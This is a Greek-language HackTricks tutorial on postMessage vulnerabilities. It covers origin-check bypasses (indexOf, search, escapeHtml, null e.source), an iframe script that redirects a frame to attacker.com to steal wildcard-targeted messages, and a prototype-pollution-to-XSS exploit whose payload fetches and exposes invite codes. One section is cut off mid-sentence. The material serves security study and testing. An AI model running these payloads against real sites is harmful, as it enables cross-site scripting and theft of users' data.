# Ευπάθειες PostMessage

## Ευπάθειες PostMessage

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Αποστολή **PostMessage**

Το **PostMessage** χρησιμοποιεί την παρακάτω συνάρτηση για να στείλει ένα μήνυμα:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Σημειώστε ότι το **targetOrigin** μπορεί να είναι ένα '\*' ή ένα URL όπως _https://company.com._\
Στο **δεύτερο σενάριο**, το **μήνυμα μπορεί να σταλεί μόνο σε αυτό τον τομέα** (ακόμη κι αν η προέλευση του αντικειμένου παραθύρου είναι διαφορετική).\
Εάν χρησιμοποιηθεί το **wildcard**, τα **μηνύματα μπορούν να σταλούν σε οποιονδήποτε τομέα**, και θα σταλούν στην προέλευση του αντικειμένου παραθύρου.

### Επίθεση στο iframe & wildcard στο **targetOrigin**

Όπως εξηγείται σε [**αυτήν την αναφορά**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), εάν βρείτε μια σελίδα που μπορεί να γίνει **ενσωμάτωση** (χωρίς προστασία `X-Frame-Header`) και αυτή αποστέλλει ευαίσθητο μήνυμα μέσω **postMessage** χρησιμοποιώντας ένα **wildcard** (\*), μπορείτε να **τροποποιήσετε** την **προέλευση** του **iframe** και να **διαρρεύσετε** το **ευαίσθητο** μήνυμα σε έναν τομέα που ελέγχετε εσείς.\
Σημειώστε ότι εάν η σελίδα μπορεί να ενσωματωθεί αλλά το **targetOrigin** είναι **ορισμένο σε ένα URL και όχι σε ένα wildcard**, αυτό το **κόλπο δεν θα λειτουργήσει**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Εκμετάλλευση της συνάρτησης addEventListener

Η συνάρτηση **`addEventListener`** χρησιμοποιείται από την JS για να δηλώσει τη συνάρτηση που αναμένει **`postMessages`**.\
Θα χρησιμοποιηθεί ένας κώδικας παρόμοιος με τον παρακάτω:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Σημειώστε σε αυτήν την περίπτωση πώς το **πρώτο πράγμα** που κάνει ο κώδικας είναι να **ελέγξει την προέλευση**. Αυτό είναι εξαιρετικά **σημαντικό** κυρίως αν η σελίδα πρόκειται να κάνει **οτιδήποτε ευαίσθητο** με τις ληφθείσες πληροφορίες (όπως αλλαγή κωδικού πρόσβασης). **Αν δεν ελέγχει την προέλευση, οι επιτιθέμενοι μπορούν να κάνουν τα θύματα να στείλουν αυθαίρετα δεδομένα σε αυτά τα σημεία** και να αλλάξουν τους κωδικούς πρόσβασης των θυμάτων (σε αυτό το παράδειγμα).

### Απαρίθμηση

Για να **βρείτε ακροατές γεγονότων** στην τρέχουσα σελίδα μπορείτε:

* **Αναζήτηση** του κώδικα JS για `window.addEventListener` και `$(window).on` (_έκδοση JQuery_)
* **Εκτέλεση** στην κονσόλα των εργαλείων προγραμματιστή: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Πηγαίνετε** σε _Στοιχεία --> Ακροατές Γεγονότων_ στα εργαλεία προγραμματιστή του προγράμματος περιήγησης

![](<../../.gitbook/assets/image (617).png>)

* Χρησιμοποιήστε μια **επέκταση προγράμματος περιήγησης** όπως [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ή [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Αυτές οι επεκτάσεις προγράμματος περιήγησης θα **παρακολουθούν όλα τα μηνύματα** και θα τα εμφανίζουν.

### Παράκαμψη ελέγχου προέλευσης

- Το χαρακτηριστικό **`event.isTrusted`** θεωρείται ασφαλές καθώς επιστρέφει `True` μόνο για γεγονότα που προκαλούνται από γνήσιες ενέργειες χρήστη. Αν και είναι προκλητικό να παρακαμφθεί αν υλοποιηθεί σωστά, η σημασία του στους ελέγχους ασφαλείας είναι σημαντική.

- Η χρήση της μεθόδου **`indexOf()`** για τον έλεγχο της προέλευσης στα γεγονότα PostMessage μπορεί να είναι ευάλωτη σε παράκαμψη. Ένα παράδειγμα που επεξηγεί αυτήν την ευπάθεια είναι:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- Η μέθοδος **`search()`** από το `String.prototype.search()` προορίζεται για τις κανονικές εκφράσεις, όχι για συμβολοσειρές. Η παράδοση οποιουδήποτε άλλου πράγματος εκτός από μια κανονική έκφραση οδηγεί σε αυτόματη μετατροπή σε κανονική έκφραση, καθιστώντας τη μέθοδο δυνητικά μη ασφαλή. Αυτό συμβαίνει επειδή στις κανονικές εκφράσεις, ένα τελεία (.) λειτουργεί ως μπαλαντέρ, επιτρέποντας την παράκαμψη του ελέγχου με ειδικά διαμορφωμένους τομείς. Για παράδειγμα:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Η συνάρτηση **`match()`**, παρόμοια με την `search()`, επεξεργάζεται κανονικές εκφράσεις. Αν η κανονική έκφραση δεν έχει σωστή δομή, μπορεί να είναι ευάλωτη σε παράκαμψη.

- Η συνάρτηση **`escapeHtml`** προορίζεται για την απολύμανση των εισόδων με την απόδραση χαρακτήρων. Ωστόσο, δεν δημιουργεί ένα νέο αντικείμενο αποδρασμένων χαρακτήρων, αλλά αντικαθιστά τις ιδιότητες του υπάρχοντος αντικειμένου. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί. Ειδικότερα, αν ένα αντικείμενο μπορεί να διαμορφωθεί έτσι ώστε η ελεγχόμενη ιδιότητά του να μην αναγνωρίζει την `hasOwnProperty`, το `escapeHtml` δεν θα λειτουργήσει όπως αναμένεται. Αυτό αποδεικνύεται στα παρακάτω παραδείγματα:

- Αναμενόμενη αποτυχία:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Παράκαμψη της απόδρασης:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Στο πλαίσιο αυτής της ευπάθειας, το αντικείμενο `File` είναι ιδιαίτερα εκμεταλλεύσιμο λόγω της ιδιότητας `name` που είναι μόνο για ανάγνωση. Αυτή η ιδιότητα, όταν χρησιμοποιείται σε πρότυπα, δεν απολυμαίνεται από τη συνάρτηση `escapeHtml`, με αποτέλεσμα δυνητικούς κινδύνους ασφάλειας.

- Η ιδιότητα `document.domain` στην JavaScript μπορεί να οριστεί από ένα σενάριο για να μειωθεί το μήκος του τομέα, επιτρέποντας μια πιο χαλαρή εφαρμογή της πολιτικής ίδιας προέλευσης εντός του ίδιου γονικού τομέα.

### Παράκαμψη e.origin == window.origin

Όταν ενσωματώνετε μια ιστοσελίδα μέσα σε ένα **sandboxed iframe** χρησιμοπ
```javascript
// If it’s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Μπορείτε να αναγκάσετε το **`e.source`** ενός μηνύματος να είναι null δημιουργώντας ένα **iframe** που **στέλνει** το **postMessage** και αμέσως διαγράφεται.

Για περισσότερες πληροφορίες **διαβάστε:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Παράκαμψη του X-Frame-Header

Για να εκτελέσετε αυτές τις επιθέσεις ιδανικά θα πρέπει να μπορείτε να **τοποθετήσετε την ιστοσελίδα του θύματος** μέσα σε ένα `iframe`. Ωστόσο, ορισμένα headers όπως το `X-Frame-Header` μπορούν να **εμποδίσουν** αυτήν την **συμπεριφορά**.\
Σε αυτά τα σενάρια, μπορείτε ακόμα να χρησιμοποιήσετε μια λιγότερο αόρατη επίθεση. Μπορείτε να ανοίξετε ένα νέο tab στην ευάλωτη web εφαρμογή και να επικοινωνήσετε μαζί της:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Κλοπή μηνύματος που αποστέλλεται στο παιδί μπλοκάροντας την κύρια σελίδα

Στην παρακάτω σελίδα μπορείτε να δείτε πώς μπορείτε να κλέψετε ευαίσθητα δεδομένα που αποστέλλονται μέσω **postmessage** σε ένα **παιδικό iframe** μπλοκάροντας την **κύρια** σελίδα πριν αποστείλετε τα δεδομένα και καταχραστείτε ένα **XSS στο παιδί** για να **διαρρεύσετε τα δεδομένα** πριν τα λάβει:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Κλοπή μηνύματος τροποποιώντας την τοποθεσία του iframe

Εάν μπορείτε να ενσωματώσετε μια ιστοσελίδα χωρίς το κεφαλίδα X-Frame-Header που περιέχει ένα άλλο iframe, μπορείτε να **αλλάξετε την τοποθεσία αυτού του παιδικού iframe**, έτσι αν λαμβάνει ένα **postmessage** που αποστέλλεται χρησιμοποιώντας ένα **wildcard**, ένας επιτιθέμενος μπορεί να **αλλάξει** την **προέλευση** του iframe σε μια σελίδα που **ελέγχεται** από αυτόν και να **κλέψει** το μήνυμα:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage σε Prototype Pollution και/ή XSS

Σε περιπτώσεις όπου τα δεδομένα που αποστέλλονται μέσω `postMessage` εκτελούνται από τον JS, μπορείτε να **ενσωματώσετε** την **σελίδα** και να εκμεταλλευτείτε τη **διαρροή πρωτοτύπου/XSS** αποστέλλοντας την εκμετάλλευση μέσω `postMessage`.

Μερικά παραδείγματα **πολύ καλά εξηγημένων XSS μέσω `postMessage`** μπορούν να βρεθούν στο [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Παράδειγμα μιας εκμετάλλευσης για κατάχρηση της **διαρροής πρωτοτύπου και στη συνέχεια XSS** μέσω ενός `postMessage` σε ένα `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Για **περισσότερες πληροφορίες**:

* Σύνδεσμος προς τη σελίδα για [**προσβολή πρωτοτύπου**](../deserialization/nodejs-proto-prototype-pollution/)
* Σύνδεσμος προς τη σελίδα για [**XSS**](../xss-cross-site-scripting/)
* Σύνδεσμος προς τη σελίδα για [**προσβολή πρωτοτύπου πελάτη προς XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Αναφορές

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Για πρακτική: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
